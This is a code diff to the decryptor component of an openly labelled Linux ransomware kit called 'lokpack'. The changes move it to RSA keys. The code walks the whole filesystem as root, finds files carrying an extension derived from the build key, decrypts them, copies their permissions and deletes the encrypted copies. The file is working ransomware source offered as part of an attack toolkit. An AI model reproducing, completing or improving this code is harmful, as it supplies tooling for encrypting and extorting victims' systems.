@@ -1,6 +1,8 @@
+// clang-format off
+
 /*
 
- * lokpack | Ransomware tooling for x84_64 Linux 
+ * lokpack | Ransomware tooling for x84_64 Linux
  * Written by ngn (https://ngn.tf) (2024)
 
  * This program is free software: you can redistribute it and/or modify
@@ -18,6 +20,11 @@
 
 */
 
+// clang-format on
+
+#include <fcntl.h>
+#include <sys/mman.h>
+
 #include <dirent.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -25,55 +32,77 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#include "../lib/enc.h"
 #include "../lib/log.h"
+#include "../lib/rsa.h"
 #include "../lib/util.h"
 
-void decrypt_file(char *file, char *ext) {
-  int name_sz = strlen(file) - (strlen(ext) + 1);
-  char new_file[name_sz + 1];
+void decrypt_file(char *in_file, char *ext) {
+  unsigned char in_buf[OUTPUT_SIZE];
+  unsigned char out_buf[OUTPUT_SIZE];
+
+  bool success = false;
+
+  size_t in_len  = 0;
+  size_t out_len = 0;
+
+  int  name_sz = strlen(in_file) - (strlen(ext) + 1);
+  char out_file[name_sz + 1];
+
   for (int i = 0; i < name_sz; i++)
-    new_file[i] = file[i];
-  new_file[name_sz] = '\0';
+    out_file[i] = in_file[i];
+  out_file[name_sz] = '\0';
 
-  FILE *src = fopen(file, "r+b");
-  FILE *dst = fopen(new_file, "w+b");
+  FILE *in  = fopen(in_file, "r");
+  FILE *out = fopen(out_file, "a");
 
-  if (NULL == src || NULL == dst)
+  if (NULL == in || NULL == out) {
+    debug("(%s) Failed to open in/out", in_file);
     goto FREE;
+  }
 
-  unsigned char output[64] = {0};
-  unsigned char input[64] = {0};
-  int readsz = 0;
-
-  while (true) {
-    readsz = fread(input, 1, 64, src);
-    if(readsz <= 0)
-      goto FREE;
-
-    if (decrypt(input, readsz, output) <= 0) {
-      error("Failed to decrypt %s", file);
+  while ((in_len = fread(in_buf, 1, OUTPUT_SIZE, in)) > 0) {
+    out_len = OUTPUT_SIZE;
+    if (!rsa_decrypt(in_buf, in_len, out_buf, &out_len)) {
+      debug("(%s) Failed to decrypt (%lu -> %lu)", in_file, in_len, out_len);
       goto FREE;
     }
 
-    fwrite(output, 1, readsz, dst);
-    if (readsz < 64)
+    if (fwrite(out_buf, 1, out_len, out) <= 0) {
+      debug("(%s) Failed to write output", in_file);
+      goto FREE;
+    }
+
+    if (in_len < OUTPUT_SIZE)
       break;
   }
 
-  struct stat st;
-  fstat(fileno(src), &st);
-  fchown(fileno(dst), st.st_uid, st.st_gid);
-  fchmod(fileno(dst), st.st_mode);
-  unlink(file);
+  if (!copy_stat(fileno(in), fileno(out))) {
+    debug("(%s) Failed to copy perms", in_file);
+    goto FREE;
+  }
+
+  if (unlink(in_file) < 0) {
+    debug("(%s) Failed to unlink: %s", in_file);
+    goto FREE;
+  }
+
+  success = true;
 
 FREE:
-  fclose(dst);
-  fclose(src);
+  if (NULL != in)
+    fclose(in);
+
+  if (NULL != out)
+    fclose(out);
+
+  if (!success) {
+    error("Failed to decrypt file: %s", in_file);
+    unlink(out_file);
+  }
 }
 
-void decrypt_files(char *path, clist_t *exts) {
-  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev"))
+void decrypt_files(char *path, char *ext) {
+  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run"))
     return;
 
   if (path[1] != '\0' && is_root_path(path))
@@ -84,7 +113,7 @@ void decrypt_files(char *path, clist_t *exts) {
     return;
 
   struct dirent *ent;
-  char fp[PATH_MAX];
+  char           fp[PATH_MAX];
 
   while ((ent = readdir(dir)) != NULL) {
     if (eq(ent->d_name, "."))
@@ -100,34 +129,52 @@ void decrypt_files(char *path, clist_t *exts) {
     if (stat(fp, &st) < 0)
       continue;
 
-    if ((st.st_mode & S_IFMT) == S_IFDIR)
-      decrypt_files(fp, exts);
+    if ((st.st_mode & S_IFMT) == S_IFDIR) {
+      debug("Decrypting directory: %s...", fp);
+      decrypt_files(fp, ext);
+      continue;
+    }
 
-    if (has_valid_ext(fp, exts))
-      decrypt_file(fp, exts->c[0]);
+    if (st.st_size <= 0)
+      continue;
+
+    if (has_valid_ext(fp, ext)) {
+      debug("Decrypting file: %s...", fp);
+      decrypt_file(fp, ext);
+    }
   }
 
   closedir(dir);
   return;
 }
 
-int main() {
+int main(int argc, char *argv[]) {
   if (getuid() != 0) {
     error("Please run as root!");
     return EXIT_FAILURE;
   }
 
-  clist_t *exts = clist_new();
-  char ext[8] = {0}, *sum = get_md5(BUILD_KEY);
+  if (DEBUG_MODE)
+    DEBUG = true;
+
+  char ext[8] = {0}, *sum = get_md5(BUILD_PUB);
   snprintf(ext, 8, "%.5s", sum);
-  clist_add(exts, strdup(ext));
 
   if (access("/", R_OK & W_OK) < 0) {
     error("Failed to access the root path");
     goto DONE;
   }
 
-  decrypt_files("/", exts);
+  if (!rsa_init(BUILD_PRIV, false)) {
+    error("Failed to init RSA key");
+    goto DONE;
+  }
+
+  if (argc >= 2)
+    decrypt_files(argv[1], ext);
+  else
+    decrypt_files("/", ext);
+
 DONE:
-  clist_free(exts);
+  rsa_free();
 }
